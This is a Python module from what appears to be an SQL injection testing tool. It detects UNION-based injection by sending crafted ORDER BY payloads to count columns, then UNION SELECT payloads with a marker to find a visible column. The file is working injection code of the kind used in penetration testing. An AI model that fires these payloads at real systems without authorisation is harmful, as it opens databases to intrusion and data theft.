"""UNION-based detection: find column count, then an injectable visible column."""
import random
import string
from sqldark.techniques import Technique, Result

MAX_COLS = 20
WRAPS = [("'", "-- -"), ("", "-- -"), ("\"", "-- -"), (")", "-- -"), ("')", "-- -")]


def _marker():
    return "SqlDk" + "".join(random.choices(string.ascii_uppercase, k=6))


class UnionBased(Technique):
    name = "UNION query"
    letter = "U"

    def test(self, point, baseline):
        # 1) Determine column count with ORDER BY. --level widens the boundary set.
        for prefix, suffix in self.library_boundaries(WRAPS):
            cols = self._order_by_count(point, prefix, suffix, baseline)
            if cols:
                visible = self._find_visible(point, prefix, suffix, cols)
                if visible is not None:
                    self.log.ok(
                        f"UNION: {cols} columns, visible column #{visible+1} "
                        f"[{prefix!r}..{suffix!r}]")
                    return Result(self.name, point, vulnerable=True,
                                  payload=f"{prefix} UNION SELECT ...{suffix}",
                                  detail={"columns": cols, "visible": visible,
                                          "prefix": prefix, "suffix": suffix},
                                  confidence=0.92)
        return Result(self.name, point)

    def _order_by_count(self, point, prefix, suffix, baseline):
        # ORDER BY n: valid while n<=cols, error/different when n>cols
        last_ok = 0
        for n in range(1, MAX_COLS + 1):
            payload = f"{prefix} ORDER BY {n}{suffix}"
            r = self._send(point, payload)
            from sqldark.techniques import similarity
            sim = similarity(r.text, baseline.text)
            if sim >= 0.93 and r.status in (baseline.status, 200):
                last_ok = n
            else:
                if last_ok >= 1:
                    return last_ok
                return 0
        return last_ok or 0

    def _find_visible(self, point, prefix, suffix, cols):
        marker = _marker()
        for visible in range(cols):
            selects = []
            for i in range(cols):
                selects.append(f"'{marker}'" if i == visible else "NULL")
            payload = f"{prefix} UNION SELECT {','.join(selects)}{suffix}"
            r = self._send(point, payload)
            if marker in r.text:
                return visible
        return None
